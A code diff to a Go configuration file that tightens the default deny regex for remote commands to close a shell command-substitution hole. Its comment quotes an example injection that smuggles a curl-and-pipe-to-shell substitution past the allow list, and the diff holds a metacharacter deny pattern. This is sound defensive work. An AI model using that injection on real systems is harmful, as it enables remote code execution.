@@ -123,7 +123,16 @@ func SetViperConfigDefaults(viperCfg *viper.Viper) {
 	viperCfg.SetDefault("connection.keep_alive_timeout", "30s")
 
 	viperCfg.SetDefault("remote-commands.allow", []string{"^/usr/bin/.*", "^/usr/local/bin/.*", `^C:\\Windows\\System32\\.*`})
-	viperCfg.SetDefault("remote-commands.deny", []string{`(\||<|>|;|,|\n|&)`})
+	// The command is written to a script file and run through /bin/sh, so every
+	// shell metacharacter is an escape from the allow list, not just the ones
+	// that chain commands. The original set omitted $ ( ) and the backtick,
+	// which left command substitution wide open: with the default allow of
+	// ^/usr/bin/.*, "/usr/bin/env $(curl http://host/x|sh)" matches allow,
+	// matches no deny term, and the shell runs the substitution.
+	//
+	// This is a blacklist in front of a shell and should be read as defence in
+	// depth rather than a boundary. The boundary is remote-commands.enabled.
+	viperCfg.SetDefault("remote-commands.deny", []string{"(\\||<|>|;|,|\\n|&|\\$|`|\\(|\\)|\\{|\\})"})
 	viperCfg.SetDefault("remote-commands.order", []string{"allow", "deny"})
 	viperCfg.SetDefault("remote-commands.send_back_limit", 4194304)
 	viperCfg.SetDefault("remote-commands.enabled", true)
